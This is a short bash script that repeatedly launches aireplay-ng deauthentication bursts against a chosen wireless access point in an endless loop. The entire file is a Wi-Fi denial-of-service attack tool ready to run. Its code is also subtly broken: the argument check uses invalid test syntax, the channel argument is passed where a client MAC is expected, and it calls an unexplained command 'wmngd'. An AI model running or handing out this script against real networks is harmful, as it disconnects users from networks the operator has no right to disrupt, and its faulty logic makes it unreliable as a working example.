#!/bin/bash

#################################################################
# CHECKING FOR ROOT
#################################################################
if [ `echo -n $USER` != "root" ]
then
    echo "ERROR: Please run as root!"
    exit 1
fi

#################################################################
# CHECKING TO SEE IF INTERFACE IS PROVIDED
#################################################################
if [ -z ${1} || -z ${2} ]; then
    echo "Usage: `basename ${0}` interface BSSID [channel]"
    echo "Example #`basename ${0}` wlan0 34:4D:EA:94:12:E0"
    exit 1
fi

if [ ! -z ${3} ]; then
	iwconfig $1 channel $3
fi

while true; do
	if [ -z ${3} ]; then
		aireplay-ng -0 5 -a $2 $1
	else
		aireplay-ng -0 5 -c $3 -a $2 $1
	fi
	wmngd $1
done
